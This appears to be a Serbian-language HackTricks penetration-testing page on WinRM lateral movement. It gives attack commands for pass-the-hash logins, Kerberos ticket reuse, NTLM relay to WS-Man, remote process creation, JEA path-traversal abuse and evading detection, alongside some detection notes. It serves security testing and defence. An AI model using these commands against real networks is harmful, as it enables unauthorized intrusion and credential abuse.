# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM je jedan od najpraktičnijih transportnih mehanizama za **lateral movement** u Windows okruženjima jer omogućava udaljenu ljusku preko **WS-Man/HTTP(S)** bez trikova sa kreiranjem SMB servisa. Ako je na ciljnom sistemu dostupan port **5985/5986** i vaš principal ima dozvolu za udaljeno povezivanje, često možete veoma brzo preći sa „važećih kredencijala” na „interaktivnu ljusku”.

Za **enumeraciju protokola/servisa**, listenere, omogućavanje WinRM-a, `Invoke-Command` i opštu upotrebu klijenta, pogledajte:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Zašto operateri vole WinRM

- Koristi **HTTP/HTTPS** umesto SMB/RPC-a, pa često radi i tamo gde je izvršavanje nalik na PsExec blokirano.
- Uz **Kerberos**, izbegava slanje kredencijala koji se mogu ponovo upotrebiti na cilj.
- Funkcioniše bez problema iz **Windows**, **Linux** i **Python** alata (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Interaktivni PowerShell remoting pokreće **`wsmprovhost.exe`** na ciljnom sistemu u kontekstu autentifikovanog korisnika, što se operativno razlikuje od izvršavanja zasnovanog na servisima.

## Model pristupa i preduslovi

U praksi, uspešan lateral movement preko WinRM-a zavisi od **tri** stvari:

1. Ciljni sistem ima **WinRM listener** (`5985`/`5986`) i pravila firewall-a koja dozvoljavaju pristup.
2. Nalog može da se **autentifikuje** na krajnjoj tački.
3. Nalog ima dozvolu da **otvori remoting sesiju**.

Uobičajeni načini za dobijanje tog pristupa:

- **Local Administrator** na ciljnom sistemu.
- Članstvo u grupi **Remote Management Users** na novijim sistemima ili **WinRMRemoteWMIUsers__** na sistemima/komponentama koje i dalje podržavaju tu grupu.
- Izričito delegirana prava za remoting putem lokalnih security descriptor-a / izmena PowerShell remoting ACL-ova.

Ako već imate kontrolu nad računarom sa admin pravima, imajte na umu da možete i da **delegirate WinRM pristup bez punopravnog članstva u administratorskoj grupi** pomoću tehnika opisanih ovde:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Zamke pri autentifikaciji važne za lateral movement

- **Kerberos zahteva hostname/FQDN**. Ako se povezujete preko IP adrese, klijent se obično prebacuje na **NTLM/Negotiate**.
- U **workgroup** okruženjima ili u rubnim slučajevima između domena sa međusobnim poverenjem, NTLM obično zahteva **HTTPS** ili da se cilj doda u **TrustedHosts** na klijentu.
- Pri korišćenju lokalnih naloga preko Negotiate-a u workgroup okruženju, UAC ograničenja za udaljeni pristup mogu da spreče pristup, osim ako se koristi ugrađeni Administrator nalog ili `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting podrazumevano koristi **`HTTP/<host>` SPN**. U okruženjima gde je **`HTTP/<host>`** već registrovan na nekom drugom servisnom nalogu, Kerberos autentifikacija za WinRM može da ne uspe uz grešku `0x80090322`; koristite SPN sa navedenim portom ili pređite na **`WSMAN/<host>`** ako taj SPN postoji.<sup>[[3]](#references)</sup>

Ako dođete do važećih kredencijala tokom password spraying-a, provera da li rade preko WinRM-a često je najbrži način da utvrdite da li vam omogućavaju pristup ljusci:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement sa Linux-a na Windows

### NetExec / CrackMapExec za proveru i jednokratno izvršavanje

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM za interaktivne shell-ove

`evil-winrm` je i dalje najpraktičnija interaktivna opcija na Linuxu jer podržava **lozinke**, **NT hash-eve**, **Kerberos tikete**, **klijentske sertifikate**, prenos datoteka i učitavanje PowerShell/.NET koda direktno u memoriju.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Rubni slučaj za Kerberos SPN: `HTTP` naspram `WSMAN`

Kada podrazumevani SPN **`HTTP/<host>`** uzrokuje Kerberos greške, pokušajte umesto njega da zatražite/koristite ticket **`WSMAN/<host>`**. Do toga dolazi u ojačanim ili neobičnim enterprise okruženjima gde je **`HTTP/<host>`** već povezan sa drugim service account-om.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Ovo je korisno i nakon zloupotrebe **RBCD / S4U** kada ste konkretno falsifikovali ili zatražili **WSMAN** service ticket, umesto generičkog `HTTP` ticket-a.

### Autentifikacija zasnovana na sertifikatu

WinRM podržava i **autentifikaciju klijentskim sertifikatom**, ali sertifikat mora biti mapiran na ciljnom sistemu na **lokalni nalog**. Iz ofanzivne perspektive, ovo je važno kada:

- ste ukrali/izvezli važeći klijentski sertifikat i privatni ključ koji su već mapirani za WinRM;
- ste zloupotrebili **AD CS / Pass-the-Certificate** da biste pribavili sertifikat za principal, a zatim prešli na drugi put autentifikacije;
- radite u okruženjima koja namerno izbegavaju udaljeni pristup zasnovan na lozinkama.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

Client-certificate WinRM je mnogo ređi od autentifikacije lozinkom/hash-om/Kerberos-om, ali kada postoji, može da obezbedi putanju za **bočno kretanje bez lozinke** koja opstaje i nakon promene lozinke.

### Python / automatizacija pomoću `pypsrp`

Ako vam je potrebna automatizacija umesto operatorske ljuske, `pypsrp` omogućava korišćenje WinRM/PSRP-a iz Python-a uz podršku za **NTLM**, **autentifikaciju sertifikatom**, **Kerberos** i **CredSSP**.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Ako vam je potrebna preciznija kontrola nego što je pruža wrapper visokog nivoa `Client`, nižerazinski API-ji `WSMan` + `RunspacePool` korisni su za dva česta problema operatora:

- nametanje **`WSMAN`** kao Kerberos servisa/SPN-a umesto podrazumevanog očekivanja **`HTTP`** koje koriste mnogi PowerShell klijenti;
- povezivanje sa **PSRP endpointom koji nije podrazumevani**, kao što je **JEA** / prilagođena konfiguracija sesije, umesto sa `Microsoft.PowerShell`.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Prilagođene PSRP krajnje tačke i JEA su važne tokom lateralnog kretanja

Uspešna WinRM autentifikacija **ne znači** uvek da dospevate na podrazumevanu, neograničenu krajnju tačku `Microsoft.PowerShell`. Zrela okruženja mogu da izlažu **prilagođene konfiguracije sesija** ili JEA krajnje tačke sa sopstvenim ACL-ovima i ponašanjem pri pokretanju kao drugi korisnik.<sup>[[1]](#references)</sup>

Ako već imate izvršavanje koda na Windows hostu i želite da saznate koje površine za udaljeni pristup postoje, izlistajte registrovane krajnje tačke:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Kada postoji koristan endpoint, ciljaj ga eksplicitno umesto podrazumevanog shell-a:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Praktične ofanzivne implikacije:

- **Ograničena** krajnja tačka i dalje može biti dovoljna za lateral movement ako izlaže baš one cmdlet-e/funkcije koji su potrebni za kontrolu servisa, pristup fajlovima, kreiranje procesa ili proizvoljno izvršavanje .NET / eksternih komandi.
- Pogrešno konfigurisana **JEA** uloga naročito je vredna ako izlaže opasne komande kao što su `Start-Process`, široke džoker znakove, upisive provajdere ili prilagođene proxy funkcije koje omogućavaju izlazak iz predviđenih ograničenja.
- Krajnje tačke koje koriste **RunAs virtuelne naloge** ili **gMSA** naloge menjaju bezbednosni kontekst u kom se izvršavaju komande. Konkretno, krajnja tačka zasnovana na gMSA nalogu može obezbediti **mrežni identitet pri drugom skoku**, čak i kada bi se obična WinRM sesija suočila sa klasičnim problemom delegiranja.

Za prilagođenu ograničenu krajnju tačku zasebno proverite efektivne dozvole za komande i skripte: kratak spisak iz `Get-Command` sam po sebi ne dokazuje da se postojeća `.ps1` datoteka ne može pokrenuti. [Mogućnosti JEA uloga](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) izričito određuju koje putanje skripti mogu da se pozovu; druge prilagođene krajnje tačke mogu primenjivati drugačija pravila sesije. Ako dozvoljena skripta koristi sačuvani `SecureString` da bi kreirala akreditive za drugi host, blob napravljen bez eksplicitnog ključa koristi [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) i za dešifrovanje mu je uglavnom potreban kontekst korisnika i računara koji su ga zaštitili. Pre nego što izvor sa mogućnošću upisa ili kopirani blob smatrate putem za eskalaciju između hostova, proverite ACL skripte, dozvoljeno pozivanje, identitet za pokretanje i prava akreditiva na odredišnom sistemu. Nemojte ispisivati zaštićenu vrednost tokom pasivnog prikupljanja podataka.

Za prilagođenu JEA funkciju koja prihvata putanju do fajla, zajedno proverite ACL registrovane krajnje tačke, mapiranu mogućnost uloge i efektivni identitet za pokretanje. Pozivalac može imati `NoLanguage`, dok se telo funkcije izvršava u podrazumevanom jezičkom režimu sistema; virtuelni nalog takođe može imati lokalna administratorska prava. Ako funkcija proverava dozvoljeni direktorijum pomoću neobrađenog prefiksa niske, a zatim čita prosleđenu putanju, komponente `..` mogu da vode van tog direktorijuma. Granicu određuje razrešena putanja u kontekstu identiteta funkcije, a ne jezički režim pozivaoca niti prividni prefiks. Pre nego što čitljivu `.psrc` ili `.pssc` datoteku smatrate nalazom privilegovanog čitanja fajlova, potvrdite da je funkcija dostupna i da proverava konačnu putanju. Pogledajte Microsoftove smernice za [mogućnosti JEA uloga](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) i [bezbednosna razmatranja](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations).

## Lateral movement pomoću izvornog WinRM-a u Windows-u

### `winrs.exe`

`winrs.exe` je ugrađen alat i koristan je kada želite **izvorno izvršavanje WinRM komandi** bez otvaranja interaktivne PowerShell remoting sesije:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Dve zastavice se lako previde, a u praksi su važne:

- `/noprofile` je često neophodan kada udaljeni principal **nije** lokalni administrator.
- `/allowdelegate` omogućava udaljenoj ljusci da koristi vaše akreditive za pristup **trećem hostu** (na primer, kada je komandi potreban `\\fileserver\share`).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

U operativnom smislu, `winrs.exe` obično dovodi do udaljenog lanca procesa sličnog sledećem:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Ovo vredi zapamtiti jer se razlikuje od izvršavanja zasnovanog na servisima i interaktivnih PSRP sesija.

### `winrm.cmd` / WS-Man COM umesto PowerShell remoting

Možete izvršavati komande i preko **WinRM transporta** bez `Enter-PSSession`, pozivanjem WMI klasa preko WS-Man-a. Transport ostaje WinRM, dok primitiv za udaljeno izvršavanje postaje **WMI `Win32_Process.Create`**:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Taj pristup je koristan kada:

- Evidentiranje PowerShell aktivnosti podrazumeva intenzivan nadzor.
- Želite **WinRM transport**, ali ne i klasičan PS remoting tok rada.
- Razvijate ili koristite prilagođene alate zasnovane na COM objektu **`WSMan.Automation`**.

## NTLM relay ka WinRM-u (WS-Man)

Kada je SMB relay blokiran potpisivanjem, a LDAP relay ograničen, **WS-Man/WinRM** i dalje može biti privlačna meta za relay. Noviji `ntlmrelayx.py` uključuje **WinRM relay servere** i može da prosleđuje relay ka ciljevima `wsman://` ili `winrms://`.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Dve praktične napomene:

- Relay je najkorisniji kada cilj prihvata **NTLM**, a relay-ovani principal ima dozvolu da koristi WinRM.
- Noviji Impacket kod posebno obrađuje zahteve **`WSMANIDENTIFY: unauthenticated`**, tako da probe u stilu `Test-WSMan` ne prekidaju relay tok.

Za ograničenja višestrukih hop-ova nakon uspostavljanja prve WinRM sesije, pogledajte:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC i napomene o detekciji

- **Interaktivni PowerShell remoting** obično pokreće **`wsmprovhost.exe`** na cilju.
- **`winrs.exe`** obično pokreće **`winrshost.exe`**, a zatim zatraženi podređeni proces.
- Prilagođene **JEA** krajnje tačke mogu izvršavati radnje kao virtuelni nalozi **`WinRM_VA_*`** ili kao konfigurisani **gMSA**, što menja i telemetriju i ponašanje drugog hop-a u poređenju sa ljuskom u kontekstu običnog korisnika.<sup>[[1]](#references)</sup>
- Očekujte telemetriju **mrežne prijave**, događaje WinRM servisa i PowerShell operativno evidentiranje/evidentiranje blokova skripti ako koristite PSRP umesto sirovog `cmd.exe`.
- Ako vam je potrebna samo jedna komanda, `winrs.exe` ili jednokratno izvršavanje putem WinRM-a mogu biti manje uočljivi od dugotrajne interaktivne remoting sesije.
- Ako je Kerberos dostupan, prednost dajte kombinaciji **FQDN + Kerberos** u odnosu na IP + NTLM, kako biste smanjili probleme sa poverenjem i nezgodne promene klijentske postavke `TrustedHosts`.

## References

- [1] [Microsoft: Bezbednosna razmatranja za JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Greška `0x80090322` pri povezivanju PowerShell-a sa udaljenim serverom putem WinRM-a](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
